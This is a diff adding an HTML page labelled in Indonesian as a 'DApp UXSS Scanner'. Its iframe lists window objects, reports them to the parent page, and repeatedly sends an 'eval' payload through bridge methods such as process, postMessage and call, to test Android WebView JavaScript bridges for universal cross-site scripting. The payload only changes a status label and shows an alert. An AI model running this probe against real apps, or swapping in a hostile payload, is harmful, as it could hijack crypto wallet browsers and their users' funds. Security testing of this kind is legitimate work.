@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DApp UXSS Scanner</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
+        .card { background: white; padding: 15px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        #status { font-weight: bold; color: green; }
+        .detected { color: red; border: 2px solid red; padding: 10px; margin-top: 10px; }
+        iframe { width: 100%; height: 200px; border: 1px dashed red; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>DApp Scanner 🔍</h2>
+    <p>Status Halaman Utama: <span id="main-status">Aman</span></p>
+    <div id="bridge-list">Mencari Bridge...</div>
+</div>
+
+<iframe srcdoc="
+    <html>
+    <body>
+        <script>
+            function tryAttack() {
+                // Cari semua benda aneh di window
+                const keys = Object.keys(window);
+                const blacklist = ['window', 'self', 'document', 'location'];
+                
+                keys.forEach(key => {
+                    if (!blacklist.includes(key) && window[key] !== null) {
+                        parent.postMessage('Ditemukan Bridge: ' + key, '*');
+                        
+                        // Coba kirim perintah jahat ke bridge yang ditemukan
+                        try {
+                            // Ini adalah payload standar untuk ngetes UXSS
+                            const poc = JSON.stringify({
+                                type: 'eval',
+                                code: 'parent.document.getElementById(\'main-status\').innerHTML = \'TERKENA UXSS!\'; parent.document.getElementById(\'main-status\').style.color = \'red\'; alert(\'BOOM! UXSS Ditemukan pada: ' + key + '\');'
+                            });
+                            
+                            // Coba berbagai macam nama fungsi umum di Android Bridge
+                            if(window[key].process) window[key].process(poc);
+                            if(window[key].postMessage) window[key].postMessage(poc);
+                            if(window[key].call) window[key].call(poc);
+                        } catch(e) {}
+                    }
+                });
+            }
+            setInterval(tryAttack, 2000);
+        </script>
+        <p style='color:red;'>Iframe Penyerang Aktif...</p>
+    </body>
+    </html>
+"></iframe>
+
+<script>
+    // Mendengarkan laporan dari iframe
+    window.addEventListener('message', function(event) {
+        let list = document.getElementById('bridge-list');
+        if(!list.innerHTML.includes(event.data)) {
+            list.innerHTML += '<div class=\'detected\'>' + event.data + '</div>';
+        }
+    });
+</script>
+
+</body>
+</html>
